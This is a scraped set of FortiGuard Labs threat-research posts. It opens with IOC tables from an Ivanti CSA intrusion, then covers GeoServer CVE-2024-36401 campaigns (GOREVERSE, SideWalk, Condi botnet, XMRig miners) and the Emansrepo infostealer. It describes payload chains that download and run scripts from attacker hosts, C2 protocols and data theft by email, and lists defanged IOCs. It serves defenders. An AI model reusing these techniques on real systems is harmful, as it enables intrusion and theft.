Patched version of DateTimeTab.php downloaded by the threat actor from this URL to overwrite the vulnerable version. http://temp[.]sh/vQuoW/reports.php HTTP 80 Patched version reports.php downloaded by the threat actor from this URL to overwrite the vulnerable version. http://l8u6aolk4ejfsl9zeq6321zvwm2eq3[.]burpcollaborator.net HTTP 80 Accessed by the threat actor 54[.]77[.]139[.]23 oastify[.].com subdomains 34[.]250[.]195[.]30 portswigger[.]net domain IP, web app security & testing 216[.]131[.]75[.]52 Threat actor IP interacting with webshell 24[.]166[.]100[.]255 Threat actor IP interacting with webshell 67[.]217[.]228[.]92 Threat actor IP interacting with webshell 69[.]49[.]88[.]235 Threat actor IP interacting with webshell 45[.]61[.]136[.]189 Threat actor IP interacting with webshell 3[.]248[.]33[.]252 Threat actor IP interacting with webshell 38[.]207[.]159[.]76 Threat actor IP interacting with webshell 193[.]189[.]100[.]197 Threat actor IP interacting with webshell 23[.]236[.]66[.]97 Threat actor IP interacting with webshell PATH FILE NAME SHA1 HASH NOTES \\Device\\HarddiskVolume2\\ProgramData\\1.log 1.log Reconnaissance output \\Device\\HarddiskVolume2\\ProgramData\\bakeup.bat bakeup.bat Unknown batch file \\Device\\HarddiskVolume2\\ProgramData\\output output Reconnaissance output \\Device\\HarddiskVolume2\\ProgramData\\sess010981 sess010981 Reconnaissance output C:\\inetpub\\wwwroot\\aspnet_client\\read.txt read.txt Unknown text file https://10.10.11.31/client/site.php site.php Web shell on CSA appliance c:\\programdata\\output.hex output.hex Encoded reconnaissance output brokes brokes beb723a5f20a1a2c4375f9aa250d968d55155689 Bruteforcer binary passdic.txt passdic.txt List of passwords u.txt u.txt List of harvested usernames /tmp/1 1 Files downloaded on the device are created as /tmp/1 on the CSA disk /tmp/systemd-private-2e4a6ea82da94a9b9fec37fe91c9b820-broker.service-asZTdm/tmp/.br/broke broke 64efc1aad330ea9d98c0c705e16cd4b3af7e74f8 Linux brute force binary /client/site.php site.php Web shell on CSA appliance /gsb/client.php client.php Web shell on CSA appliance /gsb/firewall.php firewall.php Web shell on CSA appliance /gsb/reports.php reports.php Web shell on CSA appliance /gsb/style.php style.php Web shell on CSA appliance /gsb/syslog.php?a=phpinfo(); syslog.php Web shell on CSA appliance /gsb/users.php users.php Web shell on CSA appliance /gsb/uSxhmgm.php uSxhmgm.php Web shell on CSA appliance /gsb/ZjmgmXsB.php ZjmgmXsB.php Web shell on CSA appliance install.sh install.sh 8d016d02f8fbe25dce76481a90dd0b48630ce9e74e8c31ba007cf133e48b8526 Rootkit installation script /usr/share/empty/init/sysinitd.ko sysinitd.ko 6edd7b3123de985846a805931ca8ee5f6f7ed7b160144aa0e066967bc7c0423a Rootkit – Kernel Object Module /usr/share/empty/init/sysinitd sysinitd d57a2cac394a778e19ce9b926f2e0a71936510798f30d20f207f2a49b49ce7b1 Malicious Linux binary zero-day vulnerability FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/burning-zero-days-suspected-nation-state-adversary-targets-ivanti-csa"
  },
  {
    "title": "Threat Actors Exploit GeoServer Vulnerability CVE-2024-36401",
    "content": "FortiGuard Labs Threat Research Affected Platforms:GeoServer prior to versions 2.23.6, 2.24.4, and 2.25.2Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical GeoServer is anopen-source softwareserver written in Java that allows users to share and edit geospatial data. It is the reference implementation of the Open Geospatial Consortium (OGC) Web Feature Service (WFS) and Web Coverage Service (WCS) standards. On July 1, the project maintainers released anadvisoryfor the vulnerabilityCVE-2024-36401(CVSS score: 9.8). Multiple OGC request parameters allow remote code execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions. The shortcoming has beenaddressedin versions 2.23.6, 2.24.4, and 2.25.2. On July 15, the U.S. Cybersecurity and Infrastructure Security Agency (CISA)addeda critical security flaw impacting OSGeo GeoServer GeoTools to its Known Exploited Vulnerabilities (KEV) catalog based on evidence of active exploitation. FortiGuard Labs added theIPS signaturethe next day and has observed multiple campaigns targeting this vulnerability to spread malware. The botnet family and miner groups strike the attack immediately. We also collect sidewalk backdoors, and GOREVERSE tries to exploit this vulnerability and set a connection with a command and control server (C2) to execute malicious actions. In this article, we will explore the details of the payload and malware. The payload retrieves a script from “hxxp://181[.]214[.]58[.]14:61231/remote.sh.” The script file first verifies the victim’s operating system and architecture to download the appropriate file, which it saves as “download_file.” It accommodates various OS types, including Linux, FreeBSD, Illumos, NetBSD, OpenBSD, and Solaris. After execution, it deletes the file to remove traces of its activity. The ultimate executable is “GOREVERSE,\" packed with UPX. GOREVERSE is a malicious tool that often functions as areverse proxy server, allowing attackers to illicitly access target systems or data. Once executed, the connection is made to a specific IP address (181[.]214[.]58[.]14) and port (18201), which is not a standard SSH port. From the exploitation packet of CVE-2024-36401, we observed threat actors attempting to access IT service providers in India, technology companies in the U.S., government entities in Belgium, and telecommunications companies in Thailand and Brazil. The attacker fetches the script from “hxxp://1[.]download765[.]online/d.” This batch file facilitates the download of execution files. All the ELF files on the remote server, known as the “SideWalk” malware, are designed to operate on ARM, MIPS, and X86 architectures. SideWalk is a sophisticated Linux backdoor malware also often linked with the hacking groupAPT41. First, SideWalk creates a folder named with a randomly generated string in the TMP directory. It then decodes two library files, libc.so.0 and ld-uClibc.so.1, along with the next-stage payload using the XOR key 0xCC. These decoded files are then stored in the previously created folder in the TMP path. Then, it also uses XOR to decode the string data using the key 0x89. It then executes the next stage payload, “ych7s5vvbb669ab8a.” It has three main functions: 1. Decrypt configuration: The configuration is decrypted using the ChaCha20 algorithm. The binary input contains a 16-byte MD5 hash, a 12-byte nonce for ChaCha20 decryption, and a 4-byte section indicating the length of the ciphertext, followed by the actual ciphertext. Based on the assembly code, the decryption key is hard-coded as “W9gNRmdFjxwKQosBYhkYbukO2ejZev4m,” and the decryption process runs 15 rounds (0xF). After successful decryption, the extracted C2 is secure[.]systemupdatecdn[.]de (47[.]253[.]46[.]11), listening on port 80, with the mutex name “hfdmzbtu.” 2. Establish C2 communication: Communication with the C2 server is established using an encrypted session, also based on the ChaCha20 algorithm. The packet structure comprises a 4-byte section representing the packet length, a 12-byte nonce for ChaCha20 decryption, 20 bytes of message metadata, and the final ciphertext. The initial exchange includes keys (v-key and s-key) for subsequent message encryption. In early packets, the original key, “W9gNRmdFjxwKQosBYhkYbukO2ejZev4m,” decrypts the message metadata, while the exchanged keys (v-key and s-key) decrypt the ciphertext. In packet 5, the victim’s information (computer name, operating system, and system time) is transmitted. 3. Execute the command issued by C2: In this attack scenario, we find a Plugin namedFast Reverse Proxy(FRP.) Fast Reverse Proxy (FRP) is a legitimate and widely-used tool that complicates the detection of malicious network traffic by blending it with normal traffic, thereby enhancing the stealthiness of cyberattacks. Because it is open source, this tool has been leveraged in the past by several threat actors, such asMagic Hound,Fox Kitten, andVolt Typhoon. Using FRP, attackers create an encrypted tunnel from an internally compromised machine to an external server under their control. This method enables them to maintain a foothold within compromised environments, exfiltrate sensitive data, deploy further malicious payloads, or execute other operations. In this attack case, SideWalk also downloads a customized configuration file that directs the connection to a remote server (47[.]253[.]83[.]86) via port 443, further enhancing the attacker's control and persistence. Analysis of the script download URL's telemetry reveals a concentrated pattern of infections. The primary targets appear to be distributed across three main regions: South America, Europe, and Asia. This geographical spread suggests a sophisticated and far-reaching attack campaign, potentially exploiting vulnerabilities common to these diverse markets or targeting specific industries prevalent in these areas. This script downloads and executes a file named “sky” from a specified URL, “hxxp://188[.]214[.]27[.]50:4782. “ It changes its permissions to make it executable, runs it with the parameter “geo,” and then deletes the file. The configuration data is extracted by XORing the file contents with 0x3A. This enabled us to find information like “bots[.]gxz[.]me,” which is the C2 server the malware attempts to connect to. When executing the malware, a string shows up. This malware has a credential list for brute-force attacks and a hard-coded payload related to the Huawei router vulnerability CVE-2017-17215. The payload attempts to download malware from 59[.]59[.]59[.]59. The attacker first terminates several processes (mpsl, mipsel, bash.mpsl, mips, x86_64, x86), then downloads and executes multiple bot binaries for different CPU architectures (such as ARM, MIPS, PPC, X86, M68K, SH4, and MPSL) from a remote server, “hxxp://209[.]146[.]124[.]181:8030.” The binaries are fetched using wget, saved in the /tmp directory, made executable (chmod 777), and executed. The following section uses “bot.arm7” as an example. The malware can be recognized by the specified string “condi.” Executing the malware sends numerous DNS queries to “trcpay[.]xyz.” The Condi botnet first tries to resolve the C2 server address and its function. It then establishes a connection with the C2 server and waits to parse the command. The malware has numerous DDoS attack methods, such as TCP flooding, UDP flooding, and a VSE DDoS attack. In tracing the connection back to the remote server, “hxxp://209[.]146[.]124[.]181:8030,” we found that it was built as an HFS (HTTP File Server) and that two malicious tools—“Linux2.4” (another botnet) and “taskhost.exe” (the agent tool)—are located in the server. The botnet “Linux2.4” not only has different methods that can trigger a DDoS attack but can also act as a backdoor agent. The tool first connects to a server, which is the same as the remote server “209[.]146[.]124[.]181.” It then gathers the host information. Later, it waits for the command to either conduct a remote command execution or trigger a DDoS attack. The Backdoor malware “taskhost.exe” is designed especially for Windows. It creates a service named “9jzf5” for persistence and then creates different process types to retrieve information from attackers lurking in the host. We found four types of incident coin miners that can be delivered to victim hosts, as shown in the following details. The attacker downloads a script from a remote URL “hxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860[.]txt/test.sh” and saves it as script.sh in the temp folder. The payload within the incident packets then modifies and executes the script to achieve various purposes. The script first gathers host information, such as the location of Aegis, the distribution version of Linux. Afterward, it attempts to uninstall different cloud platforms, like Tencent Cloud, Oracle, Kingsoft Cloud, JD Cloud, and Ali Cloud, to evade monitoring agents from those cloud services. A noteworthy point is that the comments in the script are written in simplified Chinese, indicating that the miner campaign/author may be affiliated with a Chinese group. While finishing these uninstalls, the script kills some security defense mechanisms processes and checks whether the current user has the root privilege needed to uninstall those mechanisms. If everything executes successfully, the script downloads the coin miner and creates another script for persistence. The coin miner, named “sshd,” wrote the configuration within itself. The miner points to two target pools: “sdfasdfsf[.]9527527[.]xyz:3333” and “gsdasdfadfs[.]9527527[.]xyz:3333.” Another type of coin miner attack begins with the Base64-encoded command. It intends to download “linux.sh” from “hxxp://repositorylinux.com.” The comment in “linux.sh” is written in Sundanese, an Indonesian language. The script downloads two files: a coin miner named “linuxsys“ and a related configuration file named “config.json.” It downloads these through an AWS (Amazon Web Service) cloud platform service the attacker holds. The coin miner sets the pool URL “pool[.]supportxmr[.]com:80” with credentials using “config.json.” The miner itself is XMRig, which can be recognized through its data. The action sent via four packets is to download “/tmp/MmkfszDi” from the remote server “hxxp://95[.]85[.]93[.]196:80/asdfakjg.sh,” make it executable, and then run it. The script downloads a coin miner like the others mentioned before. It also removes a list of files within “/tmp,” “/var,” \"/usr,\" and “/opt.” The coin miner named “h4” is similar to the other two types mentioned. It is XMRig as well and embeds its configuration within the binary file. The miner sets the pool URL as “asdfghjk[.]youdontcare[.]com:81” The last type of coin miner incident command is also encoded with base64. It downloads “cron.sh” from “112[.]133[.]194[.]254.” This fraudulent site mimics the webpage of the Institute of Chartered Accountants of India (ICAI). The site is currently removed. “cron.sh” uses the job scheduler on the Unix-like operating system “cron,” as its name indicates. The script schedules jobs for things like downloading coin miner-related scripts and setting the scripts into “crontab.” It first downloads the script named “check.sh” from the same source IP “112[.]133[.]194[.]254” and executes the script. “check.sh” first creates the necessary directories and confirms that the victim host hasn’t been infected. Once the script finds that the victim host is the first to be infected, it downloads “config.sh” from the attacker’s IP “112[.]133[.]194[.]254” and the XMRig coin miner from the developer platform “Github.” Through “config.sh,” we learned that the attacker set the pool on SupportXMR “pool[.]supportxmr[.]com:3333” While GeoServer’s open-source nature offers flexibility and customization, it also necessitates vigilant security practices to address its vulnerabilities. The developer patched the vulnerability with the function “JXPathUtils.newSafeContext” instead of the original vulnerable one to evaluate the XPath expression safety. However, implementing comprehensive cybersecurity measures—such as regularly updating software, employing threat detection tools, and enforcing strict access controls—can significantly mitigate these risks. By proactively addressing these threats, organizations can secure their environments and ensure the protection and reliability of these data infrastructures. The malware described in this report is detected and blocked by FortiGuard Antivirus as: Adware/MinerBASH/Agent.CPC!trBASH/Miner.VZ!trData/Miner.2F82!trData/Miner.3792!trELF/Agent.CPN!trELF/Agent.CPN.TRELF/BitCoinMiner.HF!trELF/Flooder.B!trLinux/CoinMiner.ACZ!trLinux/Mirai.CEA!trLinux/Mirai.CJS!trLinux/Mirai.IZ1H9!trLinux/SideWalk.Q!trRiskware/CoinMinerW32/ServStart.IO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard Web Filtering Service blocks the C2 servers and downloads URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2024-36401:GeoServer.OGC.Eval.Remote.Code.Execution We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://181[.]214[.]58[.]14:61231/remote.shhxxp://1[.]download765[.]online/dhxxp://188[.]214[.]27[.]50:4782/skyhxxp://209[.]146[.]124[.]181:8030/bot[.]armhxxp://209[.]146[.]124[.]181:8030/bot[.]arm5hxxp://209[.]146[.]124[.]181:8030/bot[.]arm6hxxp://209[.]146[.]124[.]181:8030/bot[.]arm7hxxp://209[.]146[.]124[.]181:8030/bot[.]m68khxxp://209[.]146[.]124[.]181:8030/bot[.]mipshxxp://209[.]146[.]124[.]181:8030/bot[.]mpslhxxp://209[.]146[.]124[.]181:8030/bot[.]ppchxxp://209[.]146[.]124[.]181:8030/bot[.]sh4hxxp://209[.]146[.]124[.]181:8030/bot[.]x86hxxp://209[.]146[.]124[.]181:8030/bot[.]x86_64hxxp://209[.]146[.]124[.]181:8030/JrLinuxhxxp://209[.]146[.]124[.]181:8030/Linux2[.]4hxxp://209[.]146[.]124[.]181:8030/Linux2[.]6hxxp://209[.]146[.]124[.]181:8030/taskhost[.]exehxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860.txt/test.shhxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860.txt/sshdhxxp://ec2-54-191-168-81[.]us-west-2.compute.amazonaws.com/css/linuxsyshxxp://ec2-54-191-168-81[.]us-west-2.compute.amazonaws.com/css/config.jsonhxxp://ec2-13-250-11-113[.]ap-southeast-1.compute.amazonaws.com/css/linuxsyshxxp://ec2-13-250-11-113[.]ap-southeast-1.compute.amazonaws.com/css/config.jsonhxxp://95[.]85[.]93[.]196:80/h4hxxp://112[.]133[.]194[.]254/cron.shhxxp://112[.]133[.]194[.]254/check.shhxxp://112[.]133[.]194[.]254/config.sh 181[.]214[.]58[.]14:1820147[.]253[.]46[.]11secure[.]systemupdatecdn[.]de188[.]214[.]27[.]50bots[.]gxz[.]me209[.]146[.]124[.]181sdfasdfsf[.]9527527[.]xyz:3333gsdasdfadfs[.]9527527[.]xyz:3333pool[.]supportxmr[.]com:8095[.]85[.]93[.]196:4443pool[.]supportxmr[.]com:333359[.]59[.]59[.]59 49VQVgmN9vYccj2tEgD7qgJPbLiGQcQ4uJxTRkTJUCZXRruR7HFD7keebLdYj6Bf5xZKhFKFANFxZhj3BCmRT9pe4NG325b+5000041qqpRxT7ocGsbZPeU9JcbfRiHLy3j8DWhdKzv8Yr2VS1QPcFLmfHVJFWEBDfWaB3N6HxuVuAb73nES36bN2rhevGnZ12nA b80e9466b7bb42959c29546b8c052e67fcaa0f591857617457d5d28348bd8860d9e8b390f8e2e8a6c2308c723a6a812f59c055ecad4e9098a120e5c4c65d390579c9532fb6ef2742e207498bfe2b2ee09aa9773376ac0e56085083aab17b98be5cc7e35254347f705422800bfb7fe29c6002e2537f6bac0ff996a720dfb5f48efabbb4611fb9df5d8f208d9353be0b73c3942fe78903da096cbfe2f47c9e35661588bee7db42495ba7e6e34d217e6b82c5ab93f27c1eea68435cbb9e7792f9bee8b0f5a952f07c83c4d67809ac0715c7164d518323d8038542e84aab8456db433c73ebc7a85accc65c9ee5bf151f70b990e5a12f27a843ca21c0f9d9a10fd17d9bf642a7e14f0a0b0a784f00a0d1cf590ac60ae5ae378d29d435519f4d9dbf2b994b924b00fb56e12a6a987c4cdf65dd05a221c47b5fc0a7a2babf1f05c2ed38c226744b40e8f5d2cf95b4fb2537ff00e222ecc2d24c5096ecfadb14b4a47f9796cf27a66b629d2b19708c6887441a8422b40dc0e9e7c5c0f2212efe0b6b3323b3a015b6650ec9800fa878ff9a5f732013806c8dcb0e7069515dae0dd380fda450b7e615b8cdc45486b6ed1c1c081c7a92c262edb84318fa864531dcab753f82f7b97677b6387c1f02d429e98868bf6973a8dec14dfee2516a27e885d6b1c780b60d7fb66caf103a04e81fb89dbb05111b4b0ef513f3769c8e0a8106ab01a075a9e7b5284182d3881c865895ee6e0fb03273eec3dcbf4bfc82dd2b069245beaec3101b0b74d76a95ba91b6cc4945657e928d2dac8fdf926ffbf09031d46e9186b67ab1b9b66fdc2c4ed1689698a54a347c2bdd6eaff87039ae337675243670d883fb74bb852bbd722e6ebc4e249e49cb4bb4194493a26d62d4bfcdfca299841253994a35a57970dea48e97009f65ad045b69a83234b771b106446211376a6866f3d3572ef96c9c59e137425ca6804e1b86b7f8b57210a3724d567017460774de1af8e068aa7377f0055640af581a412aa9d7288c912a93dd0d739657af0079fb1abd8cbd64d1d9c8d56b7ea6273ed62e1471f300fabc67dbc2416a48e2faf33daddccd0ecb643251af2e79e878b19a8e9c8f1c87302e732ef057cdba821f4b30d9dfe98b5fba09e17dbe29dfeb8deb7d777d4a3b0d670914691ed360b916116ad9dfe98b5fba09e17dbe29dfeb8deb7d777d4a3b0d670914691ed360b916116a8d3440301bc94ed83cdafb69e4b0166d3a0020eb4f38e9fa159c2f13f14b2d29a13a979f4ca57450528bb6cd7aa2bf47d2eea211053eb1a14b8c4a44fd6618317194ec436231c2a383ffc7c75eef4f5b5a952c18fa176ffd0830667835a8053320d97f144bf7b1662a13ac537715126b9b2f68eff46a4a09234743ae236f0177d72e4cabffc84a31e50caf827b6e579cf6e4932e5cbc528a65a68728ba56b65b5abf8a52d45f6d5970fab8d1dfd05b6ee7b0ef57df935f45761b89d3522fa59224e80d66759b1c7a075aeb4fe0321eb6ac49eaf509089fd2882874ec6228d0857355cc094f2e43e4dd7b8b698b559abe6d2d74cc48f5cfa464424314c6e41944689504850db842365cd47eadd2d3d42888b9261e7d9e884f14bb7deeb21bb61d762707f2c7fc4731c4c46ecb3364a4e7ace8984aa899cc57c624b342d3efa03f4234eb5eb42fbe44d7163c4388d263b3fe57fb1e56bf56152ac352c3fd0beec0373734730d8414d32883ebbd105c7a7c58397df995759c4e0bd367f2523d302dd1d25730122f8bc125251832c6af03aedd705dfcc2d9eebcce4371c54bb84b393dce929b1c091abac3342788624f1ffa4be5d603eec4d7ab39b604694ac05d22eb2f95bb2059a3690259f2c0d7537b3cad858869650b9c220d2d81e3720b6dde2e0e324e36fafe71f5d2bcf521e6415dafbc3f1173ad77f1f3daa77bb581da5f5d9eb83b4a6f2d49580e1658263eb972be336a2cad15a84561d17d59391191b075d7b6264f5a574bc75400c9d57282e9344d8b2df576ad2a36ab7e2575d5a395e5e5122ba6d0b06f7ed8e57ab5324ae730970c0d23913f27b9ecc9094182c03d275302d03a4378f1b852e6d783d3181c2899ae0e9ebad4c7160221320863c425653a4ad0b00e59a01142f899b6aac9712cfb25063b5b9b2e7e3171f7f3a897ed8fad39ec0671d9b401712ddbc1f24942b2ee2f4865b6ffcd2f019036e03cbadec8b76b63644d2946fd0af72b48fa59f07a78e1f84464cff5e9b1ca4110e6113e3928c5874249cc71b2d88e5c0c00989ac394238747bb7638897fc210531b4aab7d052cffcf97b303d11c5d35fa9bc860155601cdea21e38447401571b35d2db1c81d4770e812ddc883ead8ff41fd2e5a7d5bc8056521219ccf8784219d1bd819bf56711bbe0b1dac3b1481d36e7ae2f312da5f404c554c2c45a01fe591b8464d5c9722d3dc72dbeafec00256887867bad46d347a5fc797d57fc9e0fd317035d33369ddc627282eb38346e1a56118026dd3ccdb29b18ffff88ecf3663296ee6da Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401"
  },
  {
    "title": "Emansrepo Stealer: Multi-Vector Attack Chains",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In August 2024, FortiGuard Labs observed a python infostealer we call Emansrepo that is distributed via emails that include fake purchase orders and invoices. Emansrepo compresses data from the victim’s browsers and files in specific paths into a zip file and sends it to the attacker’s email. According to our research, this campaign has been ongoing since November 2023. The attacker sent a phishing mail containing an HTML file, which was redirected to the download link for Emansrepo. This variant is packaged by PyInstaller so it can run on a computer without Python. As time goes by, the attack flow has become increasingly complex. Below are the attack flows we found in July and August 2024: Various stages are being added to the attack flow before downloading Emansrepo, and multiple mailboxes are used to receive different kinds of stolen data. This article will provide a detailed analysis of each attack chain and its behavior. We will then provide a quick summary of the next campaign. The attachment is a dropper that mimics a download page. It creates a link element that points to the data of Purchase-Order.7z and uses the click() method to “download” Purchase-Order.7z. Six seconds later, it redirects to a completely unrelated website. Purchase-Order.exe, the file embedded in Purchase-Order.7z, is an AutoIt-compiled executable. It doesn’t include any files, and the AutoIt script determines its behavior. The script has many unused functions, frustrating its analysis. The only meaningful code downloads preoffice.zip to the Temp folder and unzips it into % TEMP%\\PythonTemp. The zip archive contains necessary Python modules and tester.py, the malicious script for information stealing. The innermost file in P.O.7z is an HTA file. Its source file is a JavaScript file that shows a hidden window named PowerShell Script Runner and downloads the PowerShell script, script.ps1, with VBScript for the next stage. The behavior of script.ps1 is similar to the AutoIt script in chain 1. It downloads preoffice.zip to the Temp folder and unzips it to %TEMP%\\PythonTemp, but it executes Emansrepo using run.bat. The 7z file from the link in the phishing mail contains a batch file obfuscated by BatchShield. After deobfuscation, we can see that it is not as complicated as it first seems. It simply downloads and executes script.ps1 using PowerShell. According to the email receiving the data, the infostealer behavior can be divided into three parts. It creates folders to temporarily store the stolen data for each part and deletes them after sending the data to the attacker. The stolen data is attached to the email sent to the attacker. In part 1, the Python stealer collects login data, credit card information, web history, download history, autofill, and text files (less than 0.2 MB) from the Desktop, Document, and Downloads folders. Sender minesmtp8714@maternamedical[.]top Receiver minestealer8412@maternamedical[.]top Target Browsers amigo, torch, kometa, orbitum, cent-browser, 7star, sputnik, vivaldi, google-chrome-sxs, google-chrome, epic-privacy-browser, microsoft-edge, uran, yandex, brave, iridium Folder and files %TEMP%\\Browsers: Text files (less than 0.2 MB) copied from Desktop, Document, Downloads %TEMP%\\Browsers\\{browser name}: Saved_Passwords.txt, Saved_Credit_Cards.txt, Browser_History.txt, Download_History.txt, Autofill_Data.txt Attachment Zip file of%TEMP%\\Browsersfolder Part 1 includes the initial features of Emansrepo since there is only code for part 1 in the November 2023 variant (e346f6b36569d7b8c52a55403a6b78ae0ed15c0aaae4011490404bdb04ff28e5). It’s worth noting thatemans841 reporthas been used as the divider in Saved_Passwords.txt since the December 2023 variant (ae2a5a02d0ef173b1d38a26c5a88b796f4ee2e8f36ee00931c468cd496fb2b5a). Because of this, we call it Emansrepo. The variant used in November 2023 usesPrysmax Premiumas the divider. By comparing the variant in November 2023 with the first edition of the Prysmax stealer shared on GitHub, we find they contain many similar functions, though the Emansrepo stealer had fewer features. However, as parts 2 and 3 were added to Emansrepo, it has become quite different from the Prysmax stealer. Part 2 copies PDF files (less than 0.1 MB) from the Desktop, Document, Downloads, and Recents folders and compresses folders of browser extensions, crypto wallets, and game platforms into zip files. Sender extensionsmtp@maternamedical[.]top Receiver filelogs@maternamedical[.]top Target Browsers Opera, Chrome, Brave, Vivaldi, Yandex, Edge Crypto wallet Atomic Wallet, Guarda, Zcash, Armory, Bytecoin, Exodus, Binance, Electrum, Coinomi, jaxx Game platform Steam, Riot Games Browser extension MetaMask, BNB Chain Wallet, Coinbase Wallet, Ronin Wallet, Trust Wallet, Venom Wallet, Sui Wallet, Martian Aptos & Sui Wallet, TronLink, Petra Aptos Wallet, Pontem Crypto Wallet, Fewcha Move Wallet, Math Wallet, Coin98 Wallet, Authenticator, Exodus Web3 Wallet, Phantom, Core | Crypto Wallet & NFT, TokenPocket - Web3 & Nostr Wallet, SafePal Extension Wallet, Solflare Wallet, Kaikas, iWallet, Yoroi, Guarda, Jaxx Liberty, Wombat, Oxygen - Atomic Crypto Wallet, MEW CX, GuildWallet, Saturn Wallet, Station Wallet, Harmony, EVER Wallet, KardiaChain Wallet, Pali Wallet, BOLT X, Liquality Wallet, XDEFI Wallet, Nami, MultiversX Wallet, Temple - Tezos Wallet, XMR.PT Folder and files in temp folder %TEMP%\\pdf_temps: PDF files (less than 0.1 MB) copied from Desktop, Document, Downloads and Recents folder {extension ID}.zip {data folder}.zip Attachment All files in pdf_temp Part 3 copies cookie files and zips it into {process_name}_cookies.zip. Sender cookiesmtp@maternamedical[.]top Receiver cooklielogs@maternamedical[.]top Target Browsers Chrome, msedge, brave, opera, 360se, 360browser, yandex, UCBrowser, QQBrowser Folder and files in temp folder %TEMP%\\cookies_data: {process_name}_cookies.zip Zip file Zip files in cookies_data We recently found another attack campaign using the Remcos malware, which we believe is related to the same attacker because of the phishing email. As the above screenshot shows, these attacks have the same content but use different methods to distribute malware. The attack flow for Remcos is much simpler. The attacker just sends phishing emails with a malicious attachment. The attachment is a DBatLoader, which downloads and decrypts data for the payload. The payload is a Remcos protected by a packer. Emansrepo has been active since at least last November, and the attack method is continuously evolving. The attack vectors and malware are ever-changing and pervasive, so it’s vital for organizations to maintain cybersecurity awareness. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W32/Kryptik.EB!trJS/Agent.FEI!trBAT/Downloader.2C22!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeFortinet Cybersecurity Fundamentals (FCF) training, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://bafybeigm3wrvmyw5de667rzdgdnct2fvwumyf6zyzybzh3tqvv5jhlx2ta[.]ipfs[.]dweb[.]link/wetrankfr[.]ziphxxps://bafybeifhhbimsau6a6x4m2ghdmzer5c3ixfztpocqqudlo4oyzer224q4y[.]ipfs[.]w3s[.]link/myscr649612[.]jshttps://estanciaferreira[.]com[.]br/wp-includes/TIANJIN-DOC-05082024-xls[.]7zhxxps://dasmake[.]top/reader/timer[.]phphxxps://hedam[.]shop/simple/Enquiry.7z191[.]101[.]130[.]185192[.]236[.]232[.]35 stealsmtp@dasmake[.]xyzhanbox@dasmake[.]xyzpublicsmtp@dasmake[.]xyzpublicbox@dasmake[.]xyzminesmtp8714@dasmake[.]xyzminestealer8412@dasmake.xyzminesmtp8714@maternamedical[.]topminestealer8412@maternamedical[.]topextensionsmtp@maternamedical[.]topfilelogs@maternamedical[.]topcookiesmtp@maternamedical[.]topcooklielogs@maternamedical[.]top a6c2df5df1253f50bd49e7083fef6cdac544d97db4a6c9c30d7852c4fd6519219e5580d7c3c22e37b589ec8eea2dae423c8e63f8f666c83edabecf70a0948b999bd3b8d9ac6ad680b0d0e39b82a439feedd87b9af580f37fa3d80d2c252fef8c915bad0e2dbe0a18423c046f84d0ff7232fff4e5ba255cc710783f6e4929ab3264e5c9e7b8dfb8ca8ca73895aa51e585fa7e5414f0e1d10659d3a83b9f770333b343cce5381b8633b3fd3da56698f60db70c75422e120235a00517d519e37d8d32bcbce53bfee33112b447340e7114d6d46be4ccf1a5391ad685431afdc8fb86 bee8da411e71547ac765a5e63e177b59582df438432cc3b540b57a6f1a56dd1670ba3d67b476e98419ecbbbb5d81efcb5a07f55a92c96e7b9207176746e3b7a6a2fa6790035c7af64146158f1ed20cb54f4589783e1f260a5d8e4f30b81df70d4cd8c9fa7f5e2484b73ed9c7be55aa859969c3f21ca2834610102231d337841d6670e5c7521966e82d091e7adff4e16335f03f2e2740b653adcc9bfe35c7bf9bdd656953a6844dd9585f05545a513c4e8c2ded13e06cdb67a0e58eda7575a7a49866934dd2b4e411cdabaa7a96a63f153921a6489f01b0b40d7febed48b02c22 